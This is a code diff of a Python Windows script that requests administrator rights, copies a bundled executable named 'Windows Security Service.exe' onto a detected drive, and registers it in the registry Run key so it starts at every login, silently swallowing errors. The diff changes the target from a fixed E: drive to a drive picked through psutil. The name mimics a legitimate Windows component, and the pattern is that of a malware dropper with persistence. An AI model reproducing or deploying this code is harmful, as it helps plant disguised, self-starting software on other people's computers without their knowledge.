@@ -4,6 +4,7 @@ import sys
 import ctypes
 import winreg
 import sys
+import psutil
 
 
 #Ask For Run As Administrator
@@ -16,6 +17,17 @@ def run_as_admin():
         return False
 
 if run_as_admin():
+    def list_drive_letters():
+            drive_letters = set()
+            partitions = psutil.disk_partitions(all=True)
+
+            for partition in partitions:
+                if partition.device and partition.mountpoint:
+                    drive_letter = partition.device[0].upper() + ":"
+                    drive_letters.add(drive_letter)
+
+            return sorted(drive_letters)
+    
     def move_exe_file(source_path, destination_path):
         try:
             # Check if the source file exists
@@ -30,21 +42,10 @@ if run_as_admin():
             # print(f"Error: {e}")
             pass
 
-    # Get the directory of the script or the bundled executable
-    script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
-
-    # Specify the paths
-    source_file_path = os.path.join(script_directory, r"Windows Security Service.exe")
-    destination_folder = r"E:"
-
-    move_exe_file(source_file_path, destination_folder)
-
-    # #🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴🔴 2nd Part
-
-    def add_to_startup():
+    def add_to_startup(Drive_Letter):
 
         # Get the path to the executable (assuming it's in the same directory)
-        executable_path = os.path.abspath(r"E:\Windows Security Service.exe")
+        executable_path = os.path.abspath(rf"{Drive_Letter}Windows Security Service.exe")
 
         # Create the registry key for the startup entry
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -59,9 +60,23 @@ if run_as_admin():
             # print(f"Error adding to startup: {e}")
             pass
 
-        
+    #  list_drive_letters Fuction 🟡
+    drive_letters = list_drive_letters()
+    A=drive_letters[1]
+    drive_letter = A+"\\"
 
-    # Add the executable to startup
-    add_to_startup()
+
+    #  move_exe_file Fuction 🟡
+    # Get the directory of the script or the bundled executable
+    script_directory = getattr(sys, '_MEIPASS', os.path.dirname(__file__))
+
+    # Specify the paths
+    source_file_path = os.path.join(script_directory, r"Windows Security Service.exe")
+    destination_folder = drive_letter
+
+    move_exe_file(source_file_path, destination_folder)
+
+    # add_to_startup() Fuction 🟡
+    add_to_startup(drive_letter)
 
 
